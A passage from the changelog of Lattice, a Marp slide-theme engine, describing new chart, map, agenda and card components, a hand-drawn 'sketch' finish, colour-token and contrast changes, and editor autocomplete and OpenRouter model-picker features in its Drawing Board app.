  Single-scheme decks are unchanged (no second SVG); `LATTICE_MERMAID_SINGLE=1`
  forces the prior light-bake + overrides path. The only Mermaid CSS overrides
  that remain target surfaces no themeVariable controls: journey/timeline axes and
  `treeView` labels/lines (Mermaid emits literal `black`), ER crow's-foot marker
  fill, the ER zebra-row determinism pin, and mindmap branch-colour saturation.
- **`diagram` journey mood-faces get an on-brand fill; treeView reads in dark.**
  Journey faces fill with `--bg-alt` (eyes/mouth/outline stay on `--c-line`) and
  the dashed task→face connectors are restored. `treeView-beta` labels and tree
  lines now use the flipping ink/line tokens so they are legible on a dark slide.
- **`cards-stack` rebuilt on the nested-list card contract.** The title now
  renders **bold by default** (no `**…**` needed) and the nested-bullet body
  resets to normal weight — matching `cards-grid`/`cards-side`. Previously the
  title inherited body weight and the nested body rendered as a raw bulleted
  sublist. Existing `**Title.**`-wrapped slides keep rendering identically.
- **`cards-stack` supports metadata pills.** A trailing inline `` `code` `` on
  a card's title line now renders as a right-anchored pill, the same contract
  as `cards-grid`/`cards-side`. `cards-stack` graduates off the universal-pill
  deny list.
- **`cards-stack` gains a stronger `compact` modifier.** On top of the generic
  spacing shrink, `compact` now drops card body type to `--fs-body-compact` so
  a fourth card fits without crowding.

### Added

- **`agenda` gains five interchangeable styles + page references.** The default
  is now **`ledger`** — a contents page with hand-leadered rows and an optional
  right-aligned page reference (end any item with an inline-code `` `p.15` ``).
  Four opt-in style modifiers swap the structure: **`circles`** (numbers in drawn
  rings), **`rail`** (numbered nodes on a vertical journey line), **`cards`**
  (boxed rows), and **`checks`** (a progress checklist — with `progress-N`, past
  items get a tick, the current one an arrow, future ones an empty box). All five
  are palette-blind and compose with `progress-N`; the `sketch` finish re-skins
  each by hand (wobbled rings/cards/boxes, a wavy rail and active rule, hand
  arrow/tick) by swapping only mark shapes, never colour. **Changed:** a bare
  `agenda` slide now renders as the leadered ledger rather than the former plain
  ruled list — same markdown, new look.
- **A shared legend rail for the colour-categorical charts, and a status key
  for roadmap.** The four charts that encode meaning by colour — `piechart`,
  `radar`, `map`, and `quadrant·cohort` — now share one legend treatment: a
  deterministic **70/30 split** with the chart as the hero in a wide left zone,
  the key a consistent right rail, each centred in its own zone, a gradient
  **separator spine** on the boundary, and labels that **wrap** instead of
  clipping (map's long names no longer truncate). Swatches and label type are
  unified across all four, and the spine reads on both canvases. Separately, `roadmap` now emits a
  **bottom-centre status key** (✓ shipped · – in flight · ○ planned · ╱ out of
  scope) for the marker states actually present, so an emailed deck reader can
  decode the symbols; it is omitted on the `status` variant (already labelled
  per-cell) and `horizons` (its cards carry Now/Next/Later framing). And
  `journey` — a wide board — moves its actor + mood keys from the top-left to
  **bottom-centre** and centres the diagram vertically (all five variants).
  `gantt` (status by bar colour) gains a bottom-centre **swatch + label** key
  for the statuses present, each swatch reusing the bar's exact fill; and
  `word-cloud` joins the 70/30 rail with a vertical **size = frequency** key in
  the right zone. A consistency pass left-aligns every key at a fixed inset off
  the spine (so the gap is identical chart-to-chart), lets `map` fill its zone
  instead of a fixed width, keeps the `word-cloud` cloud clear of its divider,
  opens up `journey`'s bottom keys, and re-centres the `funnel` bands (they
  were drawn right-of-centre). New `--chart-legend-*` /
  `--chart-spine-*` tokens on `section.chart-frame` are the override hooks. See
  `engineering/decisions/2026-06-11-chart-legend-system.md` and the demo deck
  `examples/chart-legends.md`.
- **`roadmap·horizons` now shows the status key too.** The horizons grid sizes
  to its cards (instead of stretching to fill the body) and the figure centres
  the stack, so the bottom-centre ✓/–/○/╱ key sits in the freed space below the
  cards — at full card density, light and dark. It was the one variant the key
  skipped (#178).
- **Editor autocomplete is now a workspace preference (Settings → Workspace).**
  A new on/off toggle (on by default) silences the deck-grammar completion popup
  for authors who'd rather type without it. Persisted in localStorage like the
  other workspace prefs; applied live via a CodeMirror compartment, so flipping
  it takes effect without reloading. Drawing Board (docs-site) only.
- **`sketch` finish — a hand-drawn skin for any deck.** A new Finish-layer
  modifier (`class: sketch` deck-wide, or `_class: <layout> sketch` per slide)
  that swaps Lattice into a hand-drawn register: felt-tip headings (Caveat), a
  legible hand-sans for prose (Shantell Sans), a wobbly accent underline, and
  the card surface of every card-style layout (`cards-grid`, `cards-stack`,
  `verdict-grid`, `decision`, `matrix-2x2`, `pricing`, `featured`,
  `compare-prose`, `citation-card`) redrawn as a sketched box (asymmetric radius
  + offset ink stroke + per-card tilt). The hand treatment reaches every other
  structure that draws its own lines too — table frames + cell rules
  (`compare-table`, `glossary`, `obligation-matrix`, `list-tabular`), boxed
  blockquotes (`quote`, `redline`), bordered/ruled row layouts (`actors`, `list`,
  `checklist`, `agenda`), and the `<hr>`
  divider — under one rule: roughen the lines the deck draws, never invent a box
  (so `big-number`/`stats` pure-type slides and contained photos/`code`/chart SVG
  stay untouched; meaning-bearing borders keep their hue). The finish re-points the
  `--font-display` token (not just heading elements) at the felt-tip face, so the
  metric numerals that ~16 components pin to `var(--font-display)` — `stats`,
  `big-number`, `quote` text, KPI heroes — take the hand face too instead of
  falling through to the theme's serif. The structural "label voice" — eyebrows,
  table column headers, stat sub-labels, KEY INSIGHT, the running header/footer —
  rides the hand SANS too, via a new `--font-label` token (defaults to
  `--font-mono`, re-pointed under `sketch`), so labels read hand-drawn instead of
  "computer"; real `code`/`pre`/math stay on `--font-mono`. Pagination (Marp's
  `section::after`) joins them on the hand label face. The slide's default font
  itself goes hand under `sketch`, so every remaining text node a component
  doesn't explicitly font — emphasis, links, stray prose — is hand too, not just
  the enumerated elements. Plain bullet lists (the `content` / `split-compare`
  layouts) trade the mechanical disc for a hand-jotted en-dash in the felt-tip
  face. Every glyph of prose
  takes a hand face — including label pills/badges (via the `--pill-font` seam);
  only real inline `code` stays monospace. It is palette-blind —
  every stroke resolves through `var(--token)`, so any theme colours it. Default
  is full handwriting; `sketch-clean-body` returns prose to the clean engine face
  for text-dense slides. New tokens: `--sketch-font-display`, `--sketch-font-body`,
  `--sketch-ink`, the engine-level `--font-label` label-voice seam, and
  `--sketch-wave` (the hand-drawn rule). Lives in `lib/base/base.sketch.css`; the two hand fonts join the
  engine's existing Google-Fonts `@import`. The lines a deck draws — table cell
  rules, ledger/agenda row rules, the `<hr>` divider — wear `--sketch-wave`, a
  near-straight pen-waver rendered as a tiling SVG **mask** (shape in the mask,
  colour via `background-color: var(--sketch-ink)`, so it stays palette-blind);
  it's a static image, not the `feTurbulence` **filter** that collapses Marp's
  print scaling, so it survives the PDF. Documented in `lib/base/base.docs.md`; demo at
  `examples/sketch.md`. See `engineering/decisions/2026-06-11-sketch-finish.md`.
- **`carta` palette — warm paper and ink.** A new theme (`carta` / `carta-dark`),
  the blessed pairing for the `sketch` finish: a warm off-white sheet, near-black
  sepia-leaning ink, and a fountain-pen ink-blue accent. Registered in
  `marp.config.js` and `.vscode/settings.json`; contrast-verified.
- **Autocomplete is now self-maintaining, gated by a parity test.** Two new
  optional manifest fields make completion data co-located with the component:
  `families` (opt a layout into a scoped family modifier group, e.g.
  `["state-markers"]` for the `checks-*`/`heat` modifiers — membership now lives
  in the manifest instead of a central by-name list) and `dataCompletion` (the
  layout has a static body-data vocabulary the editor completes, e.g. `map`). A
  new unit gate (`autocomplete-parity.test.js`) asserts completion never offers
  a modifier the linter rejects, that no family token is offered nowhere, and
  that the `dataCompletion` flags match the editor's data-source registry — so a
  future layout/variant/modifier can't be added to the engine without flowing
  into completion. New `npm run new:component` scaffold templates these fields at
  creation. Migration is behavior-preserving (the same layouts get the same
  modifiers); see `engineering/decisions/2026-06-11-autocomplete-self-maintenance.md`.
- **Drawing Board autocomplete reaches beyond `_class:` into the rest of the
  deck grammar.** Four new deterministic, offline completion contexts: the
  registered `theme:` names in front matter (a theme the engine doesn't know
  renders an unstyled deck — caught at the keystroke); the slide directive
  names inside an HTML comment (`_paginate`, `_header`, `_footer`, …) plus
  `_paginate`'s `true`/`false`/`skip` values; the fence language id after
  ` ``` ` (the `mermaid`/`chart` blocks plus the eagerly-highlighted
  languages); and Mermaid diagram/flow keywords inside a ```mermaid fence. The
  Mermaid keyword list is now one source of truth shared with the editor's
  highlighter. Drawing Board (docs-site) only.
- **Family (scoped) modifiers are now discoverable in autocomplete.** The
  `checks-*` icon-style modifiers (and `heat`) on the state-bearing layouts,
  and `canvas` on charts, are cross-cutting section modifiers that apply to a
  *subset* of layouts — so they fit neither the universal nor the per-component
  variant tier and were therefore never **suggested** by the Drawing Board /
  playground class-name autocomplete (they rendered and linted fine). A new
  `FAMILY_MODIFIERS` registry (`lib/components/index.js`, + `familyModifiersFor`
  / `FAMILY_MODIFIER_TOKENS`) scopes them by component name / bucket; the
  docs-portal threads a per-component `familyModifiers` list into the catalog so
  autocomplete offers them **only on the layouts they apply to**, right after
  the component's own variants. `heat` and `canvas` move out of the faux-universal
  `BASE_MODIFIERS` into this tier (still accepted everywhere by the linter). See
  `design/design-system.md` §6.5 (now four tiers).
- **Drawing Board: spend budgeting & alerting for Converse.** An optional guardrail
  in the Cloud AI settings: set a **dollar cap** on this session's app spend and
  choose **Alert** (a toast) or **Stop** (block new sends) when it's reached, with a
  heads-up toast at **80%**. The budget is anchored to the user's real OpenRouter
  credit — the account strip flags a **low balance** (≤20% of a known key limit, or
  below a user-set floor for pay-as-you-go keys) — with the cap as an optional tighter
  self-limit. Checked per turn from each reply's `usage.cost` (no background polling);
  pure `budgetStatus` evaluation is unit-tested. Drawing Board (docs-site) only.
- **Drawing Board: model context windows + an account/spend readout in the picker.**
  Each OpenRouter model row (and the collapsed summary) now shows its **context
  window** (e.g. "200K ctx") alongside price, a **VISION** badge for image-capable
  models, and max-output/modality in the row tooltip. The Cloud AI section gains an
  **account strip**: the OpenRouter balance/usage for the connected key (`$X left ·
  $Y used`, hidden when unavailable) plus a **per-Lattice spend tally** ("Spent via
  Lattice: $A this session · $B all-time") accumulated locally from each reply's
  authoritative `usage.cost`. Drawing Board (docs-site) only.
- **Drawing Board: slide-context autocomplete in the editor.** Inside a
  `<!-- _class: … -->` directive the CodeMirror editor now completes component
  names (chip-tagged by bucket) and then the modifiers legal for that component
  — its own declared variants first, the universal modifiers (`dark`, `scale-l`,
  `silent`, treatments, state markers, …) after, with already-applied tokens
  filtered out. Deterministic, offline, zero model calls: the vocabulary is the
  same compact catalog + lint vocab the Architect already lints against, so
  completion and lint agree by construction. The slide-detection logic is now a
  single shared walker (`slide-context.js`), retiring the per-feature
  backward-walkers that had drifted from the grammar. Drawing Board (docs-site)
  only.
- **Drawing Board: slot-skeleton drop-in and a per-component data-source
  registry for the editor's autocomplete.** On the empty body of a classed
  slide, completion now offers a one-shot `skeleton` that inserts the
  component's slot scaffold (its manifest skeleton with the directive line
  stripped) in the correct nesting — the anti-footgun for card-style layouts —
  as plain text, and stays inert once the slide has any content so it never
  clobbers authored body. The map region completer is now one entry in a small
  data-source registry (`data-sources.js`): each completer is gated to its
  component(s) through the shared slide detection, so adding the next
  static-vocabulary data component is a one-line registration. Deterministic,
  offline, zero model calls. Drawing Board (docs-site) only.
- **`q-and-a` — a layout for anticipated questions paired with prepared
  answers** (inventory bucket, `stack` form). The end-of-pitch "what we expect
  to be asked" slide: a few weighty defenses of a recommendation, authored as a
  nested list (`- Question?` with the answer nested one level under). Questions
  are indexed automatically (01, 02, …), so a `ul` and an `ol` render the same.
  Ships with five mutually-exclusive looks: the **editorial ledger** default
  (numbered index + accent rule), `spine` (accent nodes on a vertical spine for
  a sequential walkthrough), `rail` (numbered question/answer columns), `tab`
  (a true accent underline beneath each question), and `grid` (a two-up density
  grid split by a gradient hairline cross, each header reserving two lines so
  rows align). The universal `solo` gives one question/answer the whole slide
  and `compact` tightens the ledger for five-plus pairs; every colour is a
  light-dark() token, so all five looks invert under `dark`. Pure CSS, no
  transform. Distinct from a reference FAQ (many terse look-ups) and from
  `list-criteria` (evaluation criteria + rationale) — q-and-a defends a
  recommendation.
- **Drawing Board: each cloud Architect reply is labelled with the model that
  produced it** — the bubble heading reads "The Architect (DeepSeek V4 Pro)", using
  *our* record of the model we sent the turn to, not the model's self-report (which
  is unreliable — models routinely misname themselves, and a prior identity claim in
  the history gets parroted forward). The label is captured per-message and
  persisted, so older replies keep the model that made them and a mid-conversation
  model switch is visibly applied on the next reply. Drawing Board (docs-site) only.
- **Drawing Board: an OpenRouter model picker accordion, prompt-caching control,
  and standing instructions.** The cramped native model `<select>` (300+ rows) is
  replaced by an in-place accordion in the Cloud AI settings section: collapsed it
  shows the current model + price with a "Tap to change model" hint; expanded it
  offers search, **Featured / Value / Free / All** filter tabs, and a
  vendor-grouped, priced list. (Value = a curated set of strong cost-effective
  models; Free = the catalog's $0 rows.) A
  **Prompt caching** switch lets the user opt out of the cached-prefix billing and
  is gated per-model (disabled with "Not supported by this model" for vendors that
  don't support it). A **Standing instructions** box (≤500 words) is appended to the
  Architect's cached prompt prefix and honored on every turn. Drawing Board
  (docs-site) only.
- **`map` component — a US-states basemap that fills regions by value or
  category** (`evidence · spatial · series`, `chart` bucket), the first layout
  on the new **`spatial`** form. For geographic stories — program reach,
  service territories, jurisdictions, where the grants landed (the gov /
  public-sector and nonprofit archetypes a flat `image` couldn't serve).
  Author one li per region with a trailing inline-code value
  (`- California \`48.2\``); region names resolve case- and
  punctuation-insensitively by full name, postal code, or common abbreviation
  (`California` / `CA` / `Calif.`). Two read modes: **choropleth** (default)
  shades each named region on a single-hue ramp off `--cat1-hue` (low→high),
  anchored on the neutral base so a low value never sinks below an empty region
  on a dark canvas; **highlight** (`map highlight`) gives each named region its
  own `--catN` slot and leaves the rest neutral, for membership rather than
  magnitude. Names the basemap can't place are reported — a muted legend row
  plus a `data-unmatched` attribute on the figure — never silently dropped.
  The basemaps are baked, pre-projected SVG path data generated from
  public-domain geodata via `tools/build-basemap.js` (no geo library ships):
  **US states** (d3.geoAlbersUsa, AK/HI insets, US Census boundaries) and
  **world countries** (`map world`, Natural Earth 110m). They inline into the
  emulator/runtime JS bundles, never into `dist/lattice.css`, preserving the
  zero-fetch contract (the world basemaps are the catalog's largest asset — each
  projection lifts the minified runtime/emulator bundles by ~70 KB of
  well-compressed path data). New chart-family kernel module
  (`map.transform.js`) wired through the single dispatcher, so it reaches all
  three render paths via the registry. Adds the 12th `form` (`spatial`) to the
  taxonomy (`design-system.md` §4, the schema + `index.js` enums).
  - **Regional / continental grouping** (world). A group name is a "fat alias"
    that expands to a set of member countries: name a continent
    (`North America`), a UN subregion (`Sub-Saharan Africa`), a curated
    composite (`Latin America`, `Middle East`), or a dated economic bloc
    (`European Union`, `ASEAN`, `G20`, `BRICS`, `OECD`) and the kernel fills
    every member — in choropleth (one value across the bloc) or highlight (one
    colour per bloc). Blocs carry an `asOf` year; **Global South / Global North**
    ship as first-class categories pinned to a stated, dated definition — South
    to the UN Group of 77 + China (the standard UN / UNCTAD operationalization),
    North to the developed economies — carrying the same `source` + `asOf`
    provenance as the blocs, plus per-continent slices of the South
    (`global-south-africa`, `global-south-asia`, `global-south-south-america`, …).
    "Global South" is contested, so rather than pick one definition the engine
    ships the **two most-recognized views** as distinct, sourced groups and lets
    the author choose: `global-south` (G77 + China, the default) and
    `global-south-brandt` (the 1980 Brandt-Report North–South line, built as the
    geographic complement — sweeps in Mexico / Turkey / the Koreas / Taiwan,
    files the former-Soviet Central-Asian states under the North). Shipping
    sourced, dated rosters is the transparent call: the definition travels with
    the data and an author can cite it, instead of every deck hand-rolling an
    undocumented ~130-country list. States in neither list (Russia, the
    post-Soviet / Balkan economies, disputed territories) belong to no `global-*`
    group. The `grouped` modifier clusters the legend by continent.
  - **Two world projections** (world). The default is **Equal Earth** — the
    area-preserving pseudocylindrical (Šavrič et al., 2018), so the Global South
    reads at its true size instead of the high-latitude inflation Robinson and
    Mercator introduce. **Robinson** ships as the `robinson` variant
    (`map world robinson`) for audiences who expect the familiar boardroom
    silhouette. Both are baked offline into sibling JSONs
    (`map.basemap.world.json` + `map.basemap.world-robinson.json`) — still no geo
    library in any bundle.
  - **The world is the default basemap.** Bare `map` is a world map (Equal
    Earth); `map us` (alias `map usa`) selects the US-states basemap. The tokens
    sit on orthogonal axes the manifest now models explicitly (a new
    `variantAxes` field): a **Basemap** axis (`us` · `world`) and a **Modifier**
    axis (`highlight` · `robinson` · `grouped`), so the docs / gallery / variant
    chips present them as composing axes, not a flat peer list. They already
    compose in any order (`map us highlight`, `map world robinson highlight`).
    Myanmar, Czechia) and a typo is a silent gap, so the static basemap
    vocabulary drives two deterministic, zero-token defences: a **CodeMirror
    autocomplete** that completes region + group names as you type a `map` list
    item (Drawing Board / playground editor), and a **"did you mean" lint rule**
    (`unknown-map-region`, in the shared `lint-core.js`) that flags an
    unresolved name with the nearest match (`Brasil` → `Brazil`) in both the
    CLI and the in-browser Architect.
  - v1 draws US states + world countries — not counties, districts, or city
    pins (and the world 110m cut omits the smallest city-states). Demo deck:
    `examples/map.md`.
- **`funnel` component — a tapering stage chart showing where a flow drops
  off** (`evidence · canvas · series`, `chart` bucket). For any narrowing
  pipeline — sales / conversion funnel, hiring pipeline, grant / donor
  pipeline. Author one li per stage in flow order with a trailing inline-code
  value (`- Signups \`4,800\``); the kernel draws centred trapezoid bands
  (width ∝ value), flanks each with its label and value, and prints the
  stage-to-stage conversion % in the gaps. Each stage takes a distinct hue
  from the categorical chart palette, rotating `--catN` exactly like the
  piechart wedges — so the colours are on-brand per theme (cuoio's curated
  earth pigments, etc.) and a funnel reads like the rest of the chart family.
  Labels and values sit on the canvas, so the fills never affect text contrast.
  New chart-family kernel module (`funnel.transform.js`) wired through the
  single dispatcher, so it reaches all three render paths via the registry with
  no per-renderer code. Demo deck: `examples/funnel.md`.
- **`pricing` component — plan tiers with prices, feature checklists, and one
  recommended column** (`comparison · grid · structure`). The plans / packages
  slide for commercial (sales, product launch), membership / fundraising
  (giving tiers), and procurement (RFP cost options) decks. Author one li per
  tier: a plain name (auto-bold), a trailing inline-code price (`$49 / mo`,
  `Custom`), an optional `*Most popular*` marker that renders as a ribbon and
  elevates the card, then nested `[x]` (included) / `[/]` (not, struck through)
  / `[-]` (limited) feature rows and a marker-less "who it's for" line.
  Variants `two` / `four` adjust the column count. Shares verdict-grid's badge
  machinery (the `[x]`/`[-]`/`[ ]`/`[/]` → badge transform now also fires on
  `.pricing` in all three render paths). Demo deck: `examples/pricing.md`.
- **`logo-wall` component — a grid of customer / partner / funder marks as
  social proof** (`inventory · grid · prose`). The credibility slide every
  go-to-market and mission-driven deck reaches for — *trusted by* (corporate),
  *our funders* (nonprofit), *participating agencies* (government). Author a
  bulleted list of inline images (`- ![Brand](brand.svg)`); marks render
  desaturated and uniform (the same grayscale treatment as the corner deck
  logo) so mismatched brand colours don't fight. Variants: `color` (keep brand
  hues for insignia / crests), `dense` (six columns for a longer roster).
  Pure CSS — no transform. Demo deck: `examples/logo-wall.md`.
- **The emulator now renders inline content images (`![alt](url)`).** Previously
  `lattice-emulator.js` only handled block-level `![bg …]` backgrounds, so an
  in-flow image rendered as literal markdown text; it now parses inline images
  to `<img>`, matching marp-core (the marp-cli and runtime paths already did
  this natively). Unblocks image-in-prose components such as `logo-wall`.
- **Drawing Board Converse adds OpenRouter as a second cloud AI tier.**
  Alongside Puter (free, user-pays, no key), the Architect can now Converse
  through the user's own OpenRouter account via one-click OAuth (PKCE — no key
  to paste, no backend). Side-by-side "Connect" buttons in Converse let the user
  pick either; the settings popover adds a Cloud AI section with a model picker
  (500+ models, live per-million pricing) and Disconnect. Puter stays the default
  cloud — when both are connected an active-cloud preference decides, defaulting
  to the proven tier. OpenRouter is OpenAI-compatible and streams; it's treated
  as a capable tier (full Lattice dossier + edit protocol), same as Puter/WebLLM.
  On the OpenRouter (Anthropic) path the static prompt prefix — persona + the
  Lattice primer + the edit protocol, ~10K tokens identical every turn — carries
  an `ephemeral` prompt-cache breakpoint (1-hour TTL, so it survives think-gaps
  across an authoring session rather than expiring after the default 5 minutes),
  so repeat turns bill that slice at ~10%
  instead of in full; only the per-deck score/findings/deck tail is re-read. The
  flattened (uncached) prompt other backends receive is byte-identical, so their
  behaviour is unchanged. Docs-site only — no engine render-path change.
- **`--accent-soft-body` token completes the soft accent-container vocabulary.**
  Soft accent surfaces (`--accent-soft` fill) now have a named body-text token
  alongside `--on-accent-soft` (emphasis/border) — it derives from `--text-body`
  (a pale tint takes canvas ink), so there's a single override seam and no new
  curated colour. `featured` consumes it. The accent-container ink-contract test
  now also guards `--accent-soft` fills against light-only inks (`--on-dark*` /
  bare white), so both the bold and soft containers are enforced.

- **Five opt-in checkbox style variants (`checks-ringed` *(default)*,
  `checks-knockout`, `checks-bold`, `checks-outline`, `checks-tonal`).** A
  universal section modifier (per-slide or per-deck) that switches the
  state-token disc treatment for `checklist` / `verdict-grid` /
  `obligation-matrix` without changing the marks or status colours. Each
  variant flips only scalar CSS knobs (`--state-fill-pct`, `--state-ring-*`,
  `--state-mark-pct`, `--state-disc-scale`) at section scope; the leaf disc
  mixes the real colours from `--state-color` + `--bg`, so variants stay
  theme-aware. The default, **Ringed Solid**, adds a hairline darker ring so a
  disc stays crisp on its own status-tinted row.
- **State-token mark tokens (`--mark-check`, `--mark-dash`, `--mark-x`,
  `--mark-slash`, plus `-bold` set) and disc-recipe knob tokens.** SVG-mask
  marks + the scalar knobs that drive the redesigned checkbox discs, in
  `lib/base/base.tokens.css`.
- **Universal pill structure tokens (`--pill-radius`, `--pill-pad-y`,
  `--pill-pad-x`, `--pill-font`, `--pill-fs`, `--pill-weight`,
  `--pill-tracking`).** A single structural contract for every status /
  metadata pill, defined in `lib/base/base.tokens.css`. Padding is em-based
  so a pill's box tracks its own text size and still scales HD → 4K. Colour
  stays per-pill via the existing `--pill-fg` / `--pill-bg` / `--pill-border`
  hooks — structure is universal, colour carries the semantics.
- **`--text-secondary` — an independent, on-brand, light/dark token for
  secondary content text.** Subtitles, eyebrows, captions, table headers,
  sub-labels and attributions previously borrowed the decorative
  `--text-muted` chrome token; they now ride a dedicated `light-dark()` pair
  curated from each theme's own ink, tuned to WCAG AA (≥4.5:1) on **both**
  the light and dark canvas across all 13 palettes (verified by
  `tools/contrast-audit.js` and a new unit gate,
  `test/unit/palette/structural-text-contrast.test.js`). Themes also gain
  `--dark-text-secondary`. The token is now part of the required-core-token
  contract (`tools/check-ownership.js`) and the `new:theme` scaffold.
- **Contrast audit now covers the secondary/label tiers and translucent
  on-dark ink.** `tools/contrast-audit.js` checks `--text-secondary` and
  `--text-label` on canvas and composites the `--on-dark-*` ramp over
  `--bg-dark` (it previously could not grade `color-mix(... transparent)`
  and had no subtitle/secondary pair at all).
- **Per-theme structural-text showcase decks** under
  `examples/token-contrast/` — one deck per palette exercising every
  affected element in both light and dark canvas modes.
- **Minified `.min` variants of every shipped CSS and JS artifact, with named
  export subpaths.** `dist/` now also carries `lattice.min.css`,
  `lattice-default.min.css`, `lattice-runtime.min.js`, and
  `lattice-emulator.min.js`, reachable via `@slidewright/lattice/css/min`,
  `/default/min`, `/runtime/min`, and `/min` respectively. The CSS minifier
  preserves Marp's `@theme`/`@size` directive comments, so a minified bundle
  still registers as a theme — the `.min` files are render-faithful to their
  unminified siblings (verified: a minified-vs-unminified render diff is
  smaller than two identical renders of the same source). Use the unminified
  files for debugging (source maps / comments) and the `.min` files for
  production / CDN delivery; the package `bin`/`main` stays the unminified
  emulator. Each build generator now emits both variants behind the same
  `build:check` freshness gate.

### Changed

- **State markers (`[x]`/`[-]`/`[ ]`/`[/]`) redesigned as colour + a distinct
  in-disc mark.** Across `checklist`, `verdict-grid`, and `obligation-matrix`
  every state is now the same status-coloured circle carrying a unique mark —
  **check / dash / x / slash** — replacing the old fill-level discs
  (filled / half / outline / slashed) and the layout-specific Unicode glyphs.
  The mark *shape* carries the meaning independently of colour, so the states
  are unambiguous in greyscale and for colour-vision-deficient viewers — the
  redundant encoding the fill-level discs lacked. Marks are font-independent
  SVG masks painted in theme tokens (knockout = `--bg`; disc = `--pass` /
  `--warn` / `--fail` / `--text-muted`), so they stay theme- and dark-mode
  aware, and `.heat` still composes. Authoring is unchanged (same markers,
  same classes); only the CSS that those classes paint changed, so the three
  render paths and page counts are unaffected. `roadmap` keeps its own dot
  vocabulary (its `planned` state is "future," not "fail") and is unchanged.
- **Every pill now shares one geometry.** The ordinary status/metadata pills
  across layouts — the universal trailing-code pill, verdict-grid badges,
  kpi, glossary range-pill, cards-grid / cards-side, obligation-matrix,
  regulatory-update (status / timeline / priority), statute-stack, and
  state-chart chips — are unified to the `--pill-*` structural tokens:
  consistent proportional padding, fully-rounded radius, and centre- /
  middle-aligned text via `inline-flex`. Pills now use the **body sans**
  (Outfit), not mono — a pill is a status / label chip, not code (mono was
  only inherited from the original trailing-`code` pill), and the sans also
  fixes vertical centring at the root: JetBrains Mono's metrics seated caps
  high in a flex-centred line box, while the sans lands them centred with no
  optical nudge. The genuinely identifier-like chips (legal citations etc.)
  are not pills and keep their own mono. Hardcoded `px` padding (glossary,
  state-chart) and the stray `9999px` radius (list-tabular) are gone, and the
  `600`/`700` font-weight split resolves to `--pill-weight`. Three pills stay
  as **sanctioned variants** that deliberately override specific axes —
  chart-status (bar-matching semi-round + gradient), list-tabular `register`
  (wide stamp), redline `.annotated` (footnote superscript / positioned
  counter) — but route everything non-deliberate through the same tokens.
  Pill colours and semantics are unchanged.
- **`--text-muted` is now decorative-only and a `light-dark()` pair.** It is
  reserved for genuinely decorative / de-emphasized marks — chrome
  (pagination/header/footer), empty-cell dashes, skipped/struck state, quote
  glyphs, code comments (DECORATIVE, WCAG-exempt) — and now carries a
  dark-canvas side (wiring in the previously orphaned `--dark-text-muted`).
  Every readable content role that used to borrow it (41 sites across 23
  files) was repointed to `--text-secondary`. `--text-label` was retuned to clear AA on canvas in the
  two themes where it sat just below (atelier, mustard). Decks that referenced
  `--text-muted` only through Lattice components are unaffected; a deck that
  hard-coded `var(--text-muted)` for body-adjacent *content* text should
  switch to `var(--text-secondary)`.
- **Chart-family fills now share one canvas-aware recipe, and warm hues no
  longer mud on the dark canvas.** kanban cards, gantt bars, progress fills,
  and state-chart nodes paint from a single shared fill recipe (the `--fill-*`
  hue/ink pair + a 1px hue-tint border + a vivid left accent). On dark the wash
  now mixes the hue toward `black` rather than the navy `--bg` (mirroring
  `--state-*-fill`), so amber / gold / red fills stay true instead of turning
  muddy. Two members specialize the geometry: **state-chart nodes are now
  neutral slate tiles** with the status carried entirely by the pill — a green
  "on-track" node no longer sits behind a green pill (no blend, and green keeps
  its one semantic), matching the kanban card ↔ pill relationship; and
  **progress bars now encode magnitude in the fill** — a horizontal gradient
  that "shoots forward" from a pale/dark origin to a saturated leading-edge head
  whose intensity scales with the percentage, with the track rail dropped so
  each bar floats like a gantt tile and the `%` readout riding the leading edge.
- **The categorical charts and the status pill now darken toward black too —
  completing the dark-mud fix.** The earlier pass moved the status/value *bar*
  fills off the navy `--bg`; this extends the same rule to the last fills that
  still mudded: the **pie wedge** and **quadrant zone** SVG gradients (which mix
  `--catN-hue` inline) now mix toward a new `--chart-cat-base` token —
  `light-dark(var(--bg), black)` — so on dark every category stays hue-true (a
  warm wedge reads gold, not brown) while the light canvas is unchanged. The
  shared **status pill** gradient and the `--catN-fill` token (quadrant dots,
  word-cloud) gain the same canvas-aware toward-black dark side. Net: quadrant
  zones, pie wedges, gantt/progress bars, kanban cards, and status pills all
  darken the one way on the dark canvas.
- **cuoio ships a curated chart palette — the first theme to flavour the
  chart family.** cuoio's charts no longer inherit the engine's default
  Apple-hue spectrum (which read as "indaco's charts" on the warm canvas);
  they now use cuoio's own earth pigments through the `--chart-catN` /
  `--chart-state-*` override hooks. Categorical colour adopts the palette
  audit's top-scored "Brand triad" set — the same `--cN` pigments cuoio's
  Mermaid diagrams use, so a pie and a flowchart read as one palette; status
  colour reuses cuoio's `--pass` / `--warn` / `--fail` so a gantt at-risk bar
  matches a `--warn` chip. See `design/theming.md` and `themes/palette-audit.md`.
- **onyx curates its charts around a slate · red · green triad.** onyx stays
  achromatic in its *chrome* (ink ramp, brand axis, mermaid, code) but its
  *charts* now carry a restrained three-colour identity — the signature red
  plus a slate and a green — over a grayscale value tail, so colour does the
  separating where it earns legibility (pie wedges, status) instead of every
  category collapsing to a gray. `--chart-cat*` leads red → slate → green →
  near-black → grays → olive; `--chart-state-*` draws from the same hues
  (pass = green, fail = the signature red, info = slate, warn = olive, mute =
  gray) so categorical and status read as one palette and a gantt at-risk bar
  matches a warn pill. Fills sit at the engine's readable depth, so the
  `--text-heading` label reads directly on every fill — measured ≥ 8:1 on both
  canvases — with no glow or plate behind the text. onyx-only; cuoio, indaco,
  and the shared engine are untouched.
- **indaco curates its charts around its cool blue-led spectrum — bringing all
  three flagship themes to one standard.** indaco now flavours the chart family
  with its own pigments instead of the engine default: `--chart-cat*` rides its
  blue-led spectrum (blue · rust · green · magenta · purple · teal · gold · cyan,
  ported from indaco's `--cN` pigments so a pie and a flowchart match), and
  `--chart-state-*` reuses indaco's living palette (`--pass`, brand blue,
  `--text-muted`) — porting its gold to a saddle-amber `warn` and curating a new
  cool **crimson** `fail`, since indaco's palette had no red. AA-verified both
  canvases. **cuoio, onyx, and indaco are now the three curated exemplars**; the
  remaining themes inherit the engine default until brought up to the same
  standard — the curation recipe and checklist live in
  `lib/components/chart/_chart-family/chart-family.style.md`.
- **Pie wedges return to the radial dome finish, shared with the quadrant.** The
  two solid-area charts (pie, quadrant) now use the *same* hub→rim area-fade
  (42/58/82 toward `--chart-cat-base`), so they read as one family — a centre-out
  fade for charts that radiate from a centre, distinct from the bar family's
  vertical wash. The flatter top→bottom wash prototyped earlier is retained as a
  documented **future variant** (see `chart-family.style.md` › "Fill finish").

### Fixed

- **Agenda "you are here" row no longer relies on background colour alone
  (WCAG 1.4.1).** The `progress` modifier marked the active row with an
